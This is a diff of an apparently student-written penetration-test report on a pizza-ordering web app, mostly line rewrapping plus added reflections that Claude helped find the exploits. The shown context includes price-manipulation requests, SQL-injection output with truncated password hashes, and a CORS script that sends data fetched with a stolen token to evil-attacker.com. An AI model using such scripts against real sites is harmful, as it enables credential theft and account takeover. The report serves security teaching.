@@ -161,11 +161,13 @@ Response (order accepted at fraudulent price):
   "order": {
     "franchiseId": 1,
     "storeId": 1,
-    "items": [{
-      "menuId": 1,
-      "description": "Veggie",
-      "price": 0.0001
-    }],
+    "items": [
+      {
+        "menuId": 1,
+        "description": "Veggie",
+        "price": 0.0001
+      }
+    ],
     "id": 20246
   },
   "jwt": "eyJpYXQiOjE3NzU5MzA0NjQs..."
@@ -461,11 +463,7 @@ Franchises before attack:
 ```json
 {
   "franchises": [
-    { "id": 1,
-      "name": "My Pizza Franchise",
-      "stores": [
-        { "id": 1, "name": "Main Store" }
-      ] },
+    { "id": 1, "name": "My Pizza Franchise", "stores": [{ "id": 1, "name": "Main Store" }] },
     { "id": 3, "name": "Provo", "stores": [] },
     { "id": 2, "name": "SLC", "stores": [] }
   ]
@@ -493,11 +491,7 @@ Franchises after attack:
 ```json
 {
   "franchises": [
-    { "id": 1,
-      "name": "My Pizza Franchise",
-      "stores": [
-        { "id": 1, "name": "Main Store" }
-      ] },
+    { "id": 1, "name": "My Pizza Franchise", "stores": [{ "id": 1, "name": "Main Store" }] },
     { "id": 2, "name": "SLC", "stores": [] }
   ]
 }
@@ -539,11 +533,13 @@ Response (order accepted):
   "order": {
     "franchiseId": 1,
     "storeId": 1,
-    "items": [{
-      "menuId": 2,
-      "description": "Veggie",
-      "price": 0.0001
-    }],
+    "items": [
+      {
+        "menuId": 2,
+        "description": "Veggie",
+        "price": 0.0001
+      }
+    ],
     "id": 438
   },
   "jwt": "eyJpYXQiOjE3NzYwNjk3NDAuLi4..."
@@ -557,11 +553,13 @@ Attack 3b — Negative price (-100) also accepted:
   "order": {
     "franchiseId": 1,
     "storeId": 1,
-    "items": [{
-      "menuId": 2,
-      "description": "Veggie",
-      "price": -100
-    }],
+    "items": [
+      {
+        "menuId": 2,
+        "description": "Veggie",
+        "price": -100
+      }
+    ],
     "id": 439
   }
 }
@@ -723,12 +721,14 @@ Exploitation scenario — attacker hosts:
 <script>
   fetch(
     'https://pizza-service.marcosotomarino.com\
-/api/order', {
-    credentials: 'include',
-    headers: {
-      Authorization: 'Bearer ' + stolenToken
-    },
-  })
+/api/order',
+    {
+      credentials: 'include',
+      headers: {
+        Authorization: 'Bearer ' + stolenToken,
+      },
+    }
+  )
     .then((r) => r.json())
     .then((data) => {
       fetch('https://evil-attacker.com/collect', {
@@ -852,22 +852,19 @@ Admin accounts identified: User 2 (admin + franchisee) and User 3 (admin).
 Extract password hash — user 1:
 
 ```json
-{ "user": { "id": 22,
-    "name": "$2b$10$myn0NQ5XGs7c..." } }
+{ "user": { "id": 22, "name": "$2b$10$myn0NQ5XGs7c..." } }
 ```
 
 Extract password hash — user 2 (admin):
 
 ```json
-{ "user": { "id": 22,
-    "name": "$2b$10$.6Ty/Gi07c6L..." } }
+{ "user": { "id": 22, "name": "$2b$10$.6Ty/Gi07c6L..." } }
 ```
 
 Extract password hash — user 3 (admin):
 
 ```json
-{ "user": { "id": 22,
-    "name": "$2b$10$ojmETXR9f/96..." } }
+{ "user": { "id": 22, "name": "$2b$10$ojmETXR9f/96..." } }
 ```
 
 Technique: nested subquery bypasses MySQL self-reference restriction:
@@ -907,11 +904,8 @@ curl -s \
 <html lang="en">
   <head>
     <title>JWT Pizza</title>
-    <script type="module" crossorigin
-      src="/assets/index-CsPcqWP-.js">
-    </script>
-    <link rel="stylesheet" crossorigin
-      href="/assets/index-CHiGweTW.css" />
+    <script type="module" crossorigin src="/assets/index-CsPcqWP-.js"></script>
+    <link rel="stylesheet" crossorigin href="/assets/index-CHiGweTW.css" />
   </head>
   ...
 </html>
@@ -1021,16 +1015,8 @@ Final state:
 ```json
 {
   "franchises": [
-    { "id": 1,
-      "name": "My Pizza Franchise",
-      "stores": [
-        { "id": 1, "name": "Main Store" }
-      ] },
-    { "id": 4,
-      "name": "Pwned Pizza",
-      "stores": [
-        { "id": 2, "name": "Hacker HQ" }
-      ] },
+    { "id": 1, "name": "My Pizza Franchise", "stores": [{ "id": 1, "name": "Main Store" }] },
+    { "id": 4, "name": "Pwned Pizza", "stores": [{ "id": 2, "name": "Hacker HQ" }] },
     { "id": 2, "name": "SLC", "stores": [] }
   ]
 }
@@ -1123,39 +1109,91 @@ Final state:
 
 ### What We Learned About Our Own Systems (Self-Attacks)
 
-For both of us, self-testing turned out to be the most eye-opening part of this whole exercise. It's one thing to build an app that works — it's another to sit down and actively try to break it.
+For both of us, self-testing turned out to be the most eye-opening part of this whole exercise. It's one thing to build
+an app that works — it's another to sit down and actively try to break it.
 
-Jay's self-attacks uncovered 6 exploitable vulnerabilities (severities 2–4) in his deployment — SQL injection, unauthenticated franchise deletion, price manipulation, CORS misconfiguration, and information disclosure — all before Marco ever touched the system. Just asking "how would I abuse this?" while reading his own code surfaced things that normal development and testing completely missed.
+Jay's self-attacks uncovered 6 exploitable vulnerabilities (severities 2–4) in his deployment — SQL injection,
+unauthenticated franchise deletion, price manipulation, CORS misconfiguration, and information disclosure — all before
+Marco ever touched the system. Just asking "how would I abuse this?" while reading his own code surfaced things that
+normal development and testing completely missed.
 
-Marco had a similar experience. His app looked fine through the frontend, but once he started intercepting requests with Burp Suite, real problems showed up. He found the same unauthenticated `DELETE /api/franchise` endpoint, a price manipulation bug where the server blindly trusted client-supplied values, stack traces leaking internal file paths, and a wide-open CORS configuration. After finding each issue, he patched it — adding auth checks, server-side price lookups, generic error responses, and a restricted origin allowlist.
+Marco had a similar experience. His app looked fine through the frontend, but once he started intercepting requests with
+Burp Suite, real problems showed up. He found the same unauthenticated `DELETE /api/franchise` endpoint, a price
+manipulation bug where the server blindly trusted client-supplied values, stack traces leaking internal file paths, and
+a wide-open CORS configuration. After finding each issue, he patched it — adding auth checks, server-side price lookups,
+generic error responses, and a restricted origin allowlist.
 
-The takeaway for both of us: **thinking like an attacker against your own code is a fundamentally different activity than building or debugging it, and it finds things nothing else does.**
+The takeaway for both of us: **thinking like an attacker against your own code is a fundamentally different activity
+than building or debugging it, and it finds things nothing else does.**
 
 ### What We Learned From Attacking Each Other (Peer Attacks)
 
-The results from our peer attacks were asymmetric, and that asymmetry itself was a lesson. Jay found 10 exploitable issues on Marco's server, including a full kill chain from self-registered user to admin takeover. Marco's 5 attacks against Jay found that most endpoints were already defended (3 severity-0 results), with only improper error handling (severity 1) and missing rate limiting (severity 2) as weaknesses. A big reason for that gap is that Jay had already patched vulnerabilities like server-side price validation during his self-attack phase — so **the self-attack phase directly hardened his system before the peer phase even started.**
+The results from our peer attacks were asymmetric, and that asymmetry itself was a lesson. Jay found 10 exploitable
+issues on Marco's server, including a full kill chain from self-registered user to admin takeover. Marco's 5 attacks
+against Jay found that most endpoints were already defended (3 severity-0 results), with only improper error handling
+(severity 1) and missing rate limiting (severity 2) as weaknesses. A big reason for that gap is that Jay had already
+patched vulnerabilities like server-side price validation during his self-attack phase — so **the self-attack phase
+directly hardened his system before the peer phase even started.**
 
-Our tooling and approaches were also quite different, and that mattered. Jay leaned on curl-based injection and chained exploits into kill chains. Marco used Burp Suite to intercept and modify requests, and ran Burp Intruder for brute force testing. That difference in technique meant we found different things — Marco's brute force test revealed that neither server had rate limiting on the login endpoint, something Jay's injection-focused self-testing never flagged. **Different testers really do bring different perspectives**, and the combination gives you much better coverage than either one alone.
+Our tooling and approaches were also quite different, and that mattered. Jay leaned on curl-based injection and chained
+exploits into kill chains. Marco used Burp Suite to intercept and modify requests, and ran Burp Intruder for brute force
+testing. That difference in technique meant we found different things — Marco's brute force test revealed that neither
+server had rate limiting on the login endpoint, something Jay's injection-focused self-testing never flagged.
+**Different testers really do bring different perspectives**, and the combination gives you much better coverage than
+either one alone.
 
-Even when Marco's attacks were blocked (like trying admin actions with a regular user token, or manipulating prices on Jay's already-patched server), seeing those defenses hold was still valuable — it confirmed the fixes actually worked in practice.
+Even when Marco's attacks were blocked (like trying admin actions with a regular user token, or manipulating prices on
+Jay's already-patched server), seeing those defenses hold was still valuable — it confirmed the fixes actually worked in
+practice.
 
 ### Key Themes
 
-1. **A single unparameterized query can compromise an entire system.** The SQL injection in `database.js:updateUser()` was present on both our servers and was the root cause behind the most severe attacks — privilege escalation, full database extraction, admin account takeover, and persistent data manipulation. One fix (parameterized queries) would have blocked the entire kill chain.
+1. **A single unparameterized query can compromise an entire system.** The SQL injection in `database.js:updateUser()`
+   was present on both our servers and was the root cause behind the most severe attacks — privilege escalation, full
+   database extraction, admin account takeover, and persistent data manipulation. One fix (parameterized queries) would
+   have blocked the entire kill chain.
 
-2. **Every state-changing endpoint needs authentication and authorization.** The `DELETE /api/franchise` endpoint lacked auth middleware on both servers, letting any anonymous user delete franchise data. Neither of us caught this during normal development — it was a copy-paste oversight in the starter code, and it showed us that missing a single auth check on a critical endpoint can have serious consequences.
+2. **Every state-changing endpoint needs authentication and authorization.** The `DELETE /api/franchise` endpoint lacked
+   auth middleware on both servers, letting any anonymous user delete franchise data. Neither of us caught this during
+   normal development — it was a copy-paste oversight in the starter code, and it showed us that missing a single auth
+   check on a critical endpoint can have serious consequences.
 
-3. **The server must be the source of truth for business logic.** Both servers initially accepted client-supplied prices without validation, allowing free or negative-price orders. Jay patched this before the peer phase (Marco's attack confirmed the fix worked), but Marco's server still had the issue. You simply cannot trust client-provided values for pricing, quantities, or permissions.
+3. **The server must be the source of truth for business logic.** Both servers initially accepted client-supplied prices
+   without validation, allowing free or negative-price orders. Jay patched this before the peer phase (Marco's attack
+   confirmed the fix worked), but Marco's server still had the issue. You simply cannot trust client-provided values for
+   pricing, quantities, or permissions.
 
-4. **Defense in depth works — and its absence is visible.** Marco changed the default admin credentials and JWT secret (which blocked two of Jay's attacks), but left SQL injection open, which gave Jay an alternative path to admin access anyway. No single fix is sufficient when multiple vulnerability classes exist.
+4. **Defense in depth works — and its absence is visible.** Marco changed the default admin credentials and JWT secret
+   (which blocked two of Jay's attacks), but left SQL injection open, which gave Jay an alternative path to admin access
+   anyway. No single fix is sufficient when multiple vulnerability classes exist.
 
-5. **Information disclosure gives attackers a roadmap.** Stack traces with file paths, database hostnames in `/api/docs`, `X-Powered-By: Express` headers, and `robots.txt` advertising `/admin-dashboard/` all helped map internal architecture and plan targeted attacks. Both of us found that our production environments were revealing way too much.
+5. **Information disclosure gives attackers a roadmap.** Stack traces with file paths, database hostnames in
+   `/api/docs`, `X-Powered-By: Express` headers, and `robots.txt` advertising `/admin-dashboard/` all helped map
+   internal architecture and plan targeted attacks. Both of us found that our production environments were revealing way
+   too much.
 
-6. **CORS misconfiguration is a silent, high-impact vulnerability.** Both servers reflected arbitrary origins with `Access-Control-Allow-Credentials: true`, meaning any malicious website could make authenticated API calls on behalf of a logged-in user. Combined with JWTs that never expire and are stored in `localStorage`, this creates a persistent credential theft vector that requires no user interaction beyond visiting a malicious page.
+6. **CORS misconfiguration is a silent, high-impact vulnerability.** Both servers reflected arbitrary origins with
+   `Access-Control-Allow-Credentials: true`, meaning any malicious website could make authenticated API calls on behalf
+   of a logged-in user. Combined with JWTs that never expire and are stored in `localStorage`, this creates a persistent
+   credential theft vector that requires no user interaction beyond visiting a malicious page.
 
-7. **Rate limiting is invisible until someone tests for it.** Neither server had rate limiting on login endpoints. This wasn't caught by self-testing focused on injection and access control — it took Marco's Burp Intruder approach to surface it. Brute force protection is easy to overlook because the system "works fine" without it.
+7. **Rate limiting is invisible until someone tests for it.** Neither server had rate limiting on login endpoints. This
+   wasn't caught by self-testing focused on injection and access control — it took Marco's Burp Intruder approach to
+   surface it. Brute force protection is easy to overlook because the system "works fine" without it.
 
-8. **Attackers chain vulnerabilities.** The most impactful attack (Jay's Attack 10 — full kill chain) wasn't a single exploit but a combination: information disclosure revealed the schema, SQL injection extracted credentials, credential overwrite enabled admin login, and the admin JWT enabled business data modification. Fixing any single link in the chain would have limited the blast radius.
+8. **Attackers chain vulnerabilities.** The most impactful attack (Jay's Attack 10 — full kill chain) wasn't a single
+   exploit but a combination: information disclosure revealed the schema, SQL injection extracted credentials,
+   credential overwrite enabled admin login, and the admin JWT enabled business data modification. Fixing any single
+   link in the chain would have limited the blast radius.
+
+9. **AI is a force multiplier for security testing — for attackers and defenders alike.** Jay used Claude's security
+   analysis capabilities to discover the majority of his exploits. The AI identified attack vectors like the SQL
+   injection kill chain, CORS misconfiguration, and the unauthenticated DELETE endpoint — things that might have taken
+   much longer to find manually or that we might not have thought to try at all. It constructed the exact payloads,
+   recognized patterns in error responses, and chained vulnerabilities together into a full exploit path. The scary part
+   is that if an AI can help a student find these issues in an afternoon, it can help a malicious actor do the same
+   thing. In an era where AI dramatically lowers the skill barrier for offensive security, investing in secure coding
+   practices and defense in depth isn't optional — it's urgent.
 
 ### Recommendations (Priority Order)
 
@@ -1214,8 +1252,22 @@ Even when Marco's attacks were blocked (like trying admin actions with a regular
 
 ### Final Reflection
 
-This assignment showed both of us that building a working application is not the same as building a secure one. Our apps worked great from a user's perspective — but the moment we started poking at them with Burp Suite and curl, real vulnerabilities fell out everywhere.
+This assignment showed both of us that building a working application is not the same as building a secure one. Our apps
+worked great from a user's perspective — but the moment we started poking at them with Burp Suite and curl, real
+vulnerabilities fell out everywhere.
 
-The combination of self-testing and peer-testing was what made this exercise so effective. Self-testing helped us each identify and fix our biggest issues before anyone else saw them, and peer-testing brought fresh eyes and different techniques that caught things we'd missed on our own. Security really does improve through iteration — test, fix, retest — and having a second person involved makes that cycle significantly more thorough.
+The combination of self-testing and peer-testing was what made this exercise so effective. Self-testing helped us each
+identify and fix our biggest issues before anyone else saw them, and peer-testing brought fresh eyes and different
+techniques that caught things we'd missed on our own. Security really does improve through iteration — test, fix, retest
+— and having a second person involved makes that cycle significantly more thorough.
 
-If there's one thing we're both taking away from this, it's that security can't be an afterthought or something you assume is fine once the app is deployed. It's an ongoing process that requires actively trying to break your own stuff, and ideally having someone else try to break it too.
+One thing that really stood out was how much AI accelerated the process. Jay used Claude to help analyze the codebase
+for vulnerabilities, and it surfaced exploit paths — complete with working payloads — that would have been easy to miss
+otherwise. It's a genuinely powerful tool for defenders, but it's also a reminder that attackers have access to the same
+capabilities. The barrier to finding and exploiting vulnerabilities is lower than it's ever been, which makes writing
+secure code from the start that much more important.
+
+If there's one thing we're both taking away from this, it's that security can't be an afterthought or something you
+assume is fine once the app is deployed. It's an ongoing process that requires actively trying to break your own stuff,
+having someone else try to break it too, and recognizing that the tools available to both sides are only getting more
+powerful.
